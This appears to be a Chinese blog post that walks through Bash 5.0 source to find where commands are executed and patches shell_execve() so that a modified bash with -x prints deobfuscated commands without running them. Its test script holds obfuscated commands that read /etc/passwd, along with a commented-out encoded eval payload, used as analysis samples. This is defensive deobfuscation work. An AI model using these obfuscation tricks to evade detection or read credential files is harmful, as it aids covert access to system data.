<h2 id="x-echo-command-at-execute"><a href="#x-echo-command-at-execute" class="headerlink" title="-x: echo_command_at_execute"></a>-x: echo_command_at_execute</h2><p>Bash 5.0 的 main() 函数在 <strong>shell.c</strong> 文件中。顺着 main() 函数的执行流程，找到参数解析部分，就能找到 Bash 5.0 如何处理 <strong>-x</strong> 选项的。按照顺序逐个介绍 main() 函数里的关键步骤(主要是关键函数调用路径)。</p>
<hr>
<p><strong>setjmp_nosigs()</strong>：</p>
<p>设置 sigjmp，捕获早期异常。</p>
<hr>
<p><strong>xtrace_init()</strong>：</p>
<p>初始化 <strong>xtrace</strong> 模块。正是该模块设定了 <strong>-x</strong> 选项的底层输出。<strong>-x</strong> 选项，在 Bash 源码中，被称作 <strong>xtrace</strong> ，意思应该就是追踪 Shell 代码的执行了。在 <strong>print_cmd.c</strong> 文件中，有以下定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">xtrace_init</span> <span class="params">()</span></div><div class="line">&#123;</div><div class="line">  xtrace_set (<span class="number">-1</span>, <span class="built_in">stderr</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">xtrace_reset</span> <span class="params">()</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> (xtrace_fd &gt;= <span class="number">0</span> &amp;&amp; xtrace_fp)</div><div class="line">    &#123;</div><div class="line">      fflush (xtrace_fp);</div><div class="line">      fclose (xtrace_fp);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (xtrace_fd &gt;= <span class="number">0</span>)</div><div class="line">    close (xtrace_fd);</div><div class="line"></div><div class="line">  xtrace_fd = <span class="number">-1</span>;</div><div class="line">  xtrace_fp = <span class="built_in">stderr</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到最后的设定， <strong>xtrace</strong> 把内容输出到 <strong>stderr</strong> 中。</p>
<hr>
<p><strong>check_dev_tty()</strong> </p>
<p>顾名思义，检查设备 tty。</p>
<p><strong>set_default_locale()</strong> ：</p>
<p>设定当前 locale。</p>
<p><strong>uidget()</strong>：</p>
<p>获取当前用户的 uid/gid/euid/egid。</p>
<p><strong>set_shell_name(argv[0])</strong>：</p>
<p>用 <strong>argv[0]</strong>(即当前 Bash 的执行体文件名) 为当前 Shell 命名。</p>
<hr>
<p><strong>parse_long_options()</strong>：</p>
<p>解析 Bash 的长参数。Bash 里面的参数分<strong>长参数</strong>和<strong>普通参数</strong>，在 <code>bash --help</code> 的输出里有说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">➜ mybash --help</div><div class="line">GNU bash, version 5.0.0(1)-release-(x86_64-pc-linux-gnu)</div><div class="line">Usage:  mybash [GNU long option] [option] ...</div><div class="line">        mybash [GNU long option] [option] script-file ...</div><div class="line">GNU long options:</div><div class="line">        --debug</div><div class="line">        --debugger</div><div class="line">        --dump-po-strings</div><div class="line">        --dump-strings</div><div class="line">        --help</div><div class="line">        --init-file</div><div class="line">        --login</div><div class="line">        --noediting</div><div class="line">        --noprofile</div><div class="line">        --norc</div><div class="line">        --posix</div><div class="line">        --pretty-print</div><div class="line">        --rcfile</div><div class="line">        --restricted</div><div class="line">        --verbose</div><div class="line">        --version</div><div class="line">Shell options:</div><div class="line">        -ilrsD or -c command or -O shopt_option         (invocation only)</div><div class="line">        -abefhkmnptuvxBCHP or -o option</div><div class="line">Type `mybash -c &quot;help set&quot;&apos; for more information about shell options.</div><div class="line">Type `mybash -c help&apos; for more information about shell builtin commands.</div><div class="line">Use the `bashbug&apos; command to report bugs.</div><div class="line"></div><div class="line">bash home page: &lt;http://www.gnu.org/software/bash&gt;</div><div class="line">General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt;</div></pre></td></tr></table></figure>
<p>可以看到我的目标， <strong>-x</strong> 并不属于 <strong>长参数</strong>。</p>
<hr>
<p><strong>parse_shell_options()</strong> :</p>
<p>解析 Bash 的普通参数，普通参数的详细说明，可以用 <code>bash -c &quot;help set&quot;</code> 来打印出来，其中就包括我想要找的 <strong>-x</strong> 参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-x  Print commands and their arguments as they are executed.</div></pre></td></tr></table></figure>
<p><strong>parse_shell_options()</strong> 的实现，同样在 <strong>shell.c</strong> 中。不过翻遍函数中的 switch-case 结构，发现并没有在该函数中直接处理 <strong>-x</strong> 参数。只好去 swtich-default 语句块中找，这里调用了一个 <strong>change_flag(‘x’, ‘-‘)</strong> 函数。</p>
<p><strong>change_flag(flag, on_or_off)</strong> 函数在 <strong>flags.c</strong> 文件中定义。函数开头，调用了 <strong>flags.c::find_flag()</strong> 函数，<strong>find_flag()</strong> 函数会从一个结构体数组 <strong>shell_flags</strong> 中检索目标 flag。<strong>shell_flags</strong> 的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">struct</span> flags_alist shell_flags[] = &#123;</div><div class="line">  <span class="comment">/* Standard sh flags. */</span></div><div class="line">  &#123; <span class="string">'a'</span>, &amp;mark_modified_vars &#125;,</div><div class="line">#<span class="keyword">if</span> defined (JOB_CONTROL)</div><div class="line">  &#123; <span class="string">'b'</span>, &amp;asynchronous_notification &#125;,</div><div class="line">#endif <span class="comment">/* JOB_CONTROL */</span></div><div class="line">  &#123; <span class="string">'e'</span>, &amp;errexit_flag &#125;,</div><div class="line">  &#123; <span class="string">'f'</span>, &amp;disallow_filename_globbing &#125;,</div><div class="line">  &#123; <span class="string">'h'</span>, &amp;hashing_enabled &#125;,</div><div class="line">  &#123; <span class="string">'i'</span>, &amp;forced_interactive &#125;,</div><div class="line">  &#123; <span class="string">'k'</span>, &amp;place_keywords_in_env &#125;,</div><div class="line">#<span class="keyword">if</span> defined (JOB_CONTROL)</div><div class="line">  &#123; <span class="string">'m'</span>, &amp;jobs_m_flag &#125;,</div><div class="line">#endif <span class="comment">/* JOB_CONTROL */</span></div><div class="line">  &#123; <span class="string">'n'</span>, &amp;read_but_dont_execute &#125;,</div><div class="line">  &#123; <span class="string">'p'</span>, &amp;privileged_mode &#125;,</div><div class="line">#<span class="keyword">if</span> defined (RESTRICTED_SHELL)</div><div class="line">  &#123; <span class="string">'r'</span>, &amp;restricted &#125;,</div><div class="line">#endif <span class="comment">/* RESTRICTED_SHELL */</span></div><div class="line">  &#123; <span class="string">'t'</span>, &amp;just_one_command &#125;,</div><div class="line">  &#123; <span class="string">'u'</span>, &amp;unbound_vars_is_error &#125;,</div><div class="line">  &#123; <span class="string">'v'</span>, &amp;verbose_flag &#125;,</div><div class="line">  &#123; <span class="string">'x'</span>, &amp;echo_command_at_execute &#125;,</div><div class="line"></div><div class="line">  <span class="comment">/* New flags that control non-standard things. */</span></div><div class="line">#<span class="keyword">if</span> <span class="number">0</span></div><div class="line">  &#123; <span class="string">'l'</span>, &amp;lexical_scoping &#125;,</div><div class="line">#endif</div><div class="line">#<span class="keyword">if</span> defined (BRACE_EXPANSION)</div><div class="line">  &#123; <span class="string">'B'</span>, &amp;brace_expansion &#125;,</div><div class="line">#endif</div><div class="line">  &#123; <span class="string">'C'</span>, &amp;noclobber &#125;,</div><div class="line">  &#123; <span class="string">'E'</span>, &amp;error_trace_mode &#125;,</div><div class="line">#<span class="keyword">if</span> defined (BANG_HISTORY)</div><div class="line">  &#123; <span class="string">'H'</span>, &amp;histexp_flag &#125;,</div><div class="line">#endif <span class="comment">/* BANG_HISTORY */</span></div><div class="line">  &#123; <span class="string">'I'</span>, &amp;no_invisible_vars &#125;,</div><div class="line">  &#123; <span class="string">'P'</span>, &amp;no_symbolic_links &#125;,</div><div class="line">  &#123; <span class="string">'T'</span>, &amp;function_trace_mode &#125;,</div><div class="line">  &#123;<span class="number">0</span>, (<span class="keyword">int</span> *)<span class="literal">NULL</span>&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>可以看到，对于 flag <strong>-x</strong> ，Bash 源码内部的标识是 <strong>echo_command_at_execute</strong> 这个变量，这个变量在 <strong>flags.c</strong> 中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Non-zero means type out the command definition after reading, but</span></div><div class="line">   before executing. */</div><div class="line"><span class="keyword">int</span> echo_command_at_execute = <span class="number">0</span>;</div></pre></td></tr></table></figure>
<p>一旦在启动 Bash 的时候，开启了 <strong>-x</strong> 选项，那么 <strong>echo_command_at_execute</strong> 的值就会被 <strong>flags.c::change_flag()</strong> 函数设定为 <strong>1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">value = find_flag (flag);</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((value == (<span class="keyword">int</span> *)FLAG_UNKNOWN) || (on_or_off != FLAG_ON &amp;&amp; on_or_off != FLAG_OFF))</div><div class="line">  <span class="keyword">return</span> (FLAG_ERROR);</div><div class="line"></div><div class="line">old_value = *value;</div><div class="line">*value = (on_or_off == FLAG_ON) ? <span class="number">1</span> : <span class="number">0</span>; <span class="comment">//#define FLAG_ON '-'</span></div></pre></td></tr></table></figure>
<p>至此，我就完成了第一个工作：找到了 <strong>-x</strong> 选项在源码中对应的标识变量。</p>
<h2 id="解析-Shell-脚本，执行-Shell-命令"><a href="#解析-Shell-脚本，执行-Shell-命令" class="headerlink" title="解析 Shell 脚本，执行 Shell 命令"></a>解析 Shell 脚本，执行 Shell 命令</h2><p>接下来，继续顺着 <strong>shell.c::main()</strong> 函数中的代码，找到解析 Shell 脚本、执行 Shell 命令的关键步骤。</p>
<p><strong>init_interactive()</strong>：</p>
<p>如果要用交互式的方式启动 Bash，这个函数就初始化交互式 Shell。</p>
<p><strong>init_noninteractive()</strong> ：</p>
<p>如果要用非交互式的方式启动 Bash，这个函数就初始化非交互式 Shell。常用的 <strong>-c</strong> 和 <strong>-x</strong> 选项就是以非交互的方式启动 Bash。</p>
<p><strong>shell_initialize()</strong> ：</p>
<p>初始化整个 Shell，从这里开始，初始完的 Shell 应该是一个可用的 Shell。</p>
<p><strong>set_default_lang()</strong> :</p>
<p>设定默认环境语言。</p>
<p><strong>set_default_locale_vars()</strong>:</p>
<p>设置默认的 locale 变量。</p>
<hr>
<p>如果是以交互式方式运行 Bash，接下来还要做一些设置。后续还要读取 Bash 的一些配置( .rc/.profile)、初始化 Bash history 等等。</p>
<p>如果要执行一个 Bash 脚本文件，还要把可能的脚本参数与脚本文件绑定(<strong>bind_args()</strong> 函数)，在这一步，读取 Shell 脚本文件名，存入变量 <strong>shell_script_filename</strong> 中。</p>
<p>如果启用 <strong>-c</strong> 选项执行一条 Bash 命令，那么调用 <strong>run_one_command()</strong> 函数来完成这个任务。</p>
<hr>
<p>最后，才是处理执行一个 Shell 脚本文件的情况。</p>
<p><strong>open_shell_script(shell_script_filename)</strong> :</p>
<p>打开 Shell 脚本文件。</p>
<p><strong>set_bash_input()</strong> ：</p>
<p>设置 Bash 的 input 环境。</p>
<p><strong>reader_loop()</strong> :</p>
<p>读取、解析、执行 Shell 脚本中的代码。<strong>reader_loop()</strong> 函数在 <strong>eval.c</strong> 文件中定义。该函数读取每一个 Shell 命令后，会调用 <strong>dispose_cmd.c::dispose_command()</strong> 函数把 Shell 命令初步解析成通用结构，Bash 中的 Command 结构在 <strong>command.h</strong> 文件中定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* What a command looks like. */</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> command &#123;</div><div class="line">  <span class="keyword">enum</span> command_type type;	<span class="comment">/* FOR CASE WHILE IF CONNECTION or SIMPLE. */</span></div><div class="line">  <span class="keyword">int</span> flags;			<span class="comment">/* Flags controlling execution environment. */</span></div><div class="line">  <span class="keyword">int</span> line;			<span class="comment">/* line number the command starts on */</span></div><div class="line">  REDIRECT *redirects;		<span class="comment">/* Special redirects for FOR CASE, etc. */</span></div><div class="line">  <span class="keyword">union</span> &#123;</div><div class="line">    <span class="keyword">struct</span> for_com *For;</div><div class="line">    <span class="keyword">struct</span> case_com *Case;</div><div class="line">    <span class="keyword">struct</span> while_com *While;</div><div class="line">    <span class="keyword">struct</span> if_com *If;</div><div class="line">    <span class="keyword">struct</span> connection *Connection;</div><div class="line">    <span class="keyword">struct</span> simple_com *Simple;</div><div class="line">    <span class="keyword">struct</span> function_def *Function_def;</div><div class="line">    <span class="keyword">struct</span> group_com *Group;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (SELECT_COMMAND)</span></div><div class="line">    <span class="keyword">struct</span> select_com *Select;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (DPAREN_ARITHMETIC)</span></div><div class="line">    <span class="keyword">struct</span> arith_com *Arith;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (COND_COMMAND)</span></div><div class="line">    <span class="keyword">struct</span> cond_com *Cond;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined (ARITH_FOR_COMMAND)</span></div><div class="line">    <span class="keyword">struct</span> arith_for_com *ArithFor;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">struct</span> subshell_com *Subshell;</div><div class="line">    <span class="keyword">struct</span> coproc_com *Coproc;</div><div class="line">  &#125; value;</div><div class="line">&#125; COMMAND;</div></pre></td></tr></table></figure>
<p>基于这个基础结构体，Bash 中定义了更多类型的 Command，后续将会为这些不同的 Command 执行不同的操作，具体可以阅读 <strong>command.h</strong> 中的代码。</p>
<p>最后，<strong>eval.c::reader_loop()</strong> 会把初步解析好的每一条 Shell 命令传给 <strong>execute_cmd.c::execute_command()</strong> 函数来执行。<strong>execute_cmd.c::execute_command()</strong> 函数，就是对每一条 Shell 命令解析、执行的入口。</p>
<hr>
<p><strong>execute_command()</strong> 函数实现非常简短：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line">    <span class="title">execute_command</span><span class="params">(command)</span></div><div class="line">        COMMAND *command;</div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> fd_bitmap *bitmap;</div><div class="line">  <span class="keyword">int</span> result;</div><div class="line"></div><div class="line">  current_fds_to_close = (<span class="keyword">struct</span> fd_bitmap *)<span class="literal">NULL</span>;</div><div class="line">  bitmap = new_fd_bitmap(FD_BITMAP_DEFAULT_SIZE);</div><div class="line">  begin_unwind_frame(<span class="string">"execute-command"</span>);</div><div class="line">  add_unwind_protect(dispose_fd_bitmap, (<span class="keyword">char</span> *)bitmap);</div><div class="line"></div><div class="line">  <span class="comment">/* Just do the command, but not asynchronously. */</span></div><div class="line">  result = execute_command_internal(command, <span class="number">0</span>, NO_PIPE, NO_PIPE, bitmap);</div><div class="line"></div><div class="line">  dispose_fd_bitmap(bitmap);</div><div class="line">  discard_unwind_frame(<span class="string">"execute-command"</span>);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(PROCESS_SUBSTITUTION)</span></div><div class="line">  <span class="comment">/* don't unlink fifos if we're in a shell function; wait until the function</span></div><div class="line">     returns. */</div><div class="line">  <span class="keyword">if</span> (variable_context == <span class="number">0</span> &amp;&amp; executing_list == <span class="number">0</span>)</div><div class="line">    unlink_fifo_list();</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* PROCESS_SUBSTITUTION */</span></span></div><div class="line"></div><div class="line">  QUIT;</div><div class="line">  <span class="keyword">return</span> (result);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>它的核心功能就是初始化 Shell 代码执行的环境之后，把 Command 交给 <strong>execute_cmd.c::execute_command_internal()</strong> 函数来执行。</p>
<hr>
<p><strong>execute_command_internal()</strong> 函数实现相当复杂，里面会根据 Command 的类型、动作涉及很多具体的函数调用，而且多个具体的函数调用会在一、二级调用之后再次调用 <strong>execute_command_internal()</strong> 函数。这样就形成了特别繁杂的递归调用。</p>
<p>在IDA Pro 里反编译 Bash 二进制文件，对 <strong>execute_command_internal()</strong> 的引用状况能看个大概：</p>
<p><img src="/imgs/mybash_xrefs_exec_cmd_intern.png" alt=""></p>
<p>但是 IDA 中的 xrefs 对于该函数的层级递归调用关系展示的并不完整，所以我手动整理了一个树形图，看完一目了然：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">execute_cmd.c::execute_command_internal()</div><div class="line">|----execute_in_subshell()</div><div class="line">|----|----&gt;execute_command_internal()</div><div class="line">|----execute_coproc()</div><div class="line">|----|----&gt;execute_in_subshell()</div><div class="line">|----|----|----&gt;execute_command_internal()</div><div class="line">|----time_command()</div><div class="line">|----|----&gt;execute_command_internal()</div><div class="line">|----execute_simple_command()</div><div class="line">|----|----&gt;execute_null_command()</div><div class="line">|----|----&gt;xtrace_print_word_list()</div><div class="line">|----|----&gt;builtin_address()--&gt; exec_builtin_fg_or_bg</div><div class="line">|----|----&gt;start_job()</div><div class="line">|----|----&gt;find_shell_builtin()</div><div class="line">|----|----execute_subshell_builtin_or_function()</div><div class="line">|----|----|----&gt;execute_builtin()</div><div class="line">|----|----|----execute_disk_command()</div><div class="line">|----|----|----|----&gt;search_for_command()</div><div class="line">|----|----|----|----&gt;find_function()</div><div class="line">|----|----|----|----execute_shell_function()</div><div class="line">|----|----|----|----|----execute_function()</div><div class="line">|----|----|----|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----|----|----&gt;shell_execve()</div><div class="line">|----|----|----|----|----|----&gt;execve()</div><div class="line">|----|----|----execute_function()</div><div class="line">|----|----|----|----&gt;find_function_def()</div><div class="line">|----|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----execute_builtin_or_function()</div><div class="line">|----|----|----&gt;execute_builtin()</div><div class="line">|----|----|----execute_function()</div><div class="line">|----|----|----|----&gt;find_function_def()</div><div class="line">|----|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----&gt;execute_disk_command()</div><div class="line">|----execute_for_command()</div><div class="line">|----|----&gt;print_for_command_head()</div><div class="line">|----|----&gt;xtrace_print_for_command_head()</div><div class="line">|----|----execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_arith_for_command()</div><div class="line">|----|----eval_arith_for_expr()</div><div class="line">|----|----|----&gt;xtrace_print_arith_cmd()</div><div class="line">|----|----|----&gt;expr.c::evalexp()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_select_command()</div><div class="line">|----|----&gt;xtrace_print_select_command_head()</div><div class="line">|----|----&gt;select_query()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_case_command()</div><div class="line">|----|----&gt;xtrace_print_case_command_head()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_while_command()</div><div class="line">|----|----execute_while_or_until()</div><div class="line">|----|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_until_command()</div><div class="line">|----|----execute_while_or_until()</div><div class="line">|----|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_if_command()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----execute_command_internal()</div><div class="line">|----execute_connection()</div><div class="line">|----|----&gt;execute_command_internal()</div><div class="line">|----|----&gt;execute_command()----&gt;execute_command_internal()</div><div class="line">|----|----execute_pipeline()</div><div class="line">|----|----|----&gt;execute_command_internal()</div><div class="line">|----|----|----&gt;jobs.c::wait_for()</div><div class="line">|----execute_arith_command()</div><div class="line">|----|----&gt;xtrace_print_arith_cmd()</div><div class="line">|----|----&gt;expr.c::evalexp()</div><div class="line">|----execute_cond_command()</div><div class="line">|----|----execute_cond_node()</div><div class="line">|----|----&gt;xtrace_print_cond_term()</div><div class="line">|----execute_intern_function()</div></pre></td></tr></table></figure>
<p>这样就给我最终找到真正执行 Shell 代码的位置带来了更多麻烦。</p>
<p>顺便说一下，在 <strong>execute_cmd.c</strong> 文件中，对于根据 <strong>-x</strong> 选项需要打印的 Shell 命令，都会判断一下是否设置 <strong>-x</strong> 选项，并打印 Shell 代码，形如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (echo_command_at_execute)</div><div class="line">    xtrace_print_case_command_head(case_command);</div></pre></td></tr></table></figure>
<hr>
<p>这样一来，要找到最终执行 Shell 代码的位置并打上 Patch，有两条路可走：</p>
<ol>
<li>在 <strong>execute_cmd.c</strong> 中，以 <strong>echo_command_at_execute</strong> 标识变量为线索，凡是检查这个变量并做相应 <strong>xtrace_print_XXX</strong> 的函数，均可能是最终输出不同类型 Command 的“终极函数”，在这些“终极函数”中，最终执行 Shell 命令之前给它打个 Patch，让它们只打印、不执行；</li>
<li>梳理清楚上面围绕 <strong>execute_command_internal()</strong> 函数繁杂的递归调用，找到递归逻辑的边界，即是最终执行 Shell 命令的代码。递归的逻辑特性就是这样，一直递归是有问题的，所以一定会有至少一个边界条件来跳出递归逻辑，执行递归逻辑之后最终的任务。我的目标就是找出这一堆多层递归逻辑的边界条件。这么些 <strong>execute_XXX()</strong> 函数，在结束对 <strong>execute_command_internal()</strong> 函数的多层递归调用之后，肯定要执行最终解混淆之后的 Shell 代码，我在它们执行代码之前，根据 <strong>echo_command_at_execute</strong> 标识变量打个 Patch 即可。</li>
</ol>
<p>经过一番分析，发现第 1 条路走不通。那些调用 <strong>xtrace_XXX()</strong> 函数来输出不同类型 Shell 命令的函数，并不是最终执行 Shell 命令的“终极函数”，它们还会把 Shell 命令交给其他的函数去执行。</p>
<p>所以只有第 2 条路。经过一番艰苦的梳理，确认最终执行 Shell 命令的函数为：<strong>execute_cmd.c::shell_execve()</strong> ，这个函数会对最后解混淆的 Shell 命令调用 C 语言的 <strong>execve()</strong> 函数。</p>
<h2 id="打-Patch"><a href="#打-Patch" class="headerlink" title="打 Patch"></a>打 Patch</h2><p>找到了目标之后，就简单了。我只需要在  <strong>execute_cmd.c::shell_execve()</strong> 函数中，调用 <strong>execve()</strong> 之前打个 Patch 即可：</p>
<p><img src="/imgs/mybash_patch.png" alt=""></p>
<p>是的，你没看错，上面费尽心血梳理源代码，最后只需改动这一处。</p>
<p>打完了 Patch，编译、运行，测试几段混淆过的 Shell 代码，效果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">➜ cat test.sh</div><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">#export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</div><div class="line"></div><div class="line">cat /et$&apos;c/pa\u0000/notexist/path&apos;sswd</div><div class="line"></div><div class="line">test=/ehhh/hmtc/pahhh/hmsswd;</div><div class="line">cat $&#123;test//hh??hm/&#125;;</div><div class="line"></div><div class="line">tmp_str=saudoihfnssoirtgn</div><div class="line">cat $(echo /e)tc$(echo /pa)$&#123;tmp_str:9:2&#125;wd</div><div class="line">printf &quot;\n\n&quot;</div><div class="line"></div><div class="line">#eval &quot;$(ijmduN3D=(\[ r f 5 4 G U \&quot; a i s p 1 t \% \&#125; \  e \) \/ \\ 0 b J k z 7 \] \; \&#123; \| D \( X 2 h 3 \= 9 V 8 w n \$ B c 6 d o);for s7SQJyu8 in 11 1 9 42 13 2 16 14 10 16 7 43 32 24 44 39 8 6 33 37 32 20 19 16 45 16 10 16 47 16 41 16 13 16 11 16 17 16 8 16 20 16 18 28 2 48 1 16 31 25 35 24 23 36 41 5 16 9 42 16 12 16 40 16 3 16 38 16 21 16 26 16 3 16 12 16 21 16 46 16 40 16 34 16 34 16 4 16 36 28 47 48 16 11 1 9 42 13 2 16 14 10 16 7 43 29 24 44 39 8 6 33 0 43 31 25 35 24 23 36 41 5 27 15 7 28 47 48 42 17 18 7 30 22 8 10 35;do printf %s &quot;$&#123;ijmduN3D[$s7SQJyu8]&#125;&quot;;done)&quot;</div><div class="line">➜</div><div class="line">➜ mybash -x test.sh</div><div class="line">+ cat /etc/passwd</div><div class="line">+ test=/ehhh/hmtc/pahhh/hmsswd</div><div class="line">+ cat /etc/passwd</div><div class="line">+ tmp_str=saudoihfnssoirtgn</div><div class="line">++ echo /e</div><div class="line">++ echo /pa</div><div class="line">+ cat /etc/passwd</div><div class="line">+ printf &apos;\n\n&apos;</div></pre></td></tr></table></figure>
<p>当然，这个 Patch 还不完美，因为没有处理重定向和管道，所以对个别情况解析不完美。有更好思路的朋友欢迎留言指教。</p>
]]></content>
    
    <summary type="html">
    
